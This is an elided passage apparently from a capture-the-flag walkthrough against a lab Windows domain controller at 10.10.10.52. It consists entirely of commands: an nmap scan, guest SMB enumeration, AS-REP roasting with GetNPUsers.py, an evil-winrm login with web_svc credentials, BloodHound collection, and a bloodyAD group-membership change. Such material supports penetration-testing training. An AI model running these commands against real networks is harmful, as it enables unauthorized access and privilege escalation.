...
```bash
oxdf@hacky$ sudo nmap -p- --reason --min-rate 10000 10.10.10.52
Starting Nmap
PORT      STATE SERVICE
53/tcp    open  domain
...
```bash
oxdf@hacky$ netexec smb 10.10.10.52 -u guest -p ''
...
```bash
oxdf@hacky$ GetNPUsers.py -dc-ip 10.10.10.52 -no-pass -usersfile users.txt domain/
...
```bash
oxdf@hacky$ evil-winrm -i 10.10.10.52 -u web_svc -p password123
...
```bash
oxdf@hacky$ netexec ldap 10.10.10.52 -u web_svc -p password123 --bloodhound -c all
```
...
```bash
oxdf@hacky$ bloodyAD -u web_svc -p password123 --host 10.10.10.52 add groupMember IT_Support web_svc
```
